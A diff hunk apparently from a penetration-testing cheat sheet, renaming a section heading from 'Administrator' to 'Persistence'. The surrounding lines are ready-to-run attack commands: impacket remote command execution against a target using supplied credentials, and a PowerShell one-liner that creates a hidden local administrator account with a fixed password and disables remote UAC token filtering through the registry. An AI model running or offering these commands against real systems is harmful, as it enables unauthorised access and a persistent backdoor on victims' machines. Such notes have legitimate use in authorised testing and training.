@@ -1210,7 +1210,7 @@ impacket-smbclient $DOM/'$USERNAME:$PASSWORD'@$TARGET
 impacket-wmiexec $DOM/'$USERNAME:$PASSWORD'@$TARGET 'whoami'
 impacket-atexec $DOM/'$USERNAME:$PASSWORD'@$TARGET 'whoami'
 
-# Administrator: Create and Attack
+# Persistence: Create and Attack
 ## Create Account
 powershell -c "Invoke-Command -ScriptBlock { net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }"
 
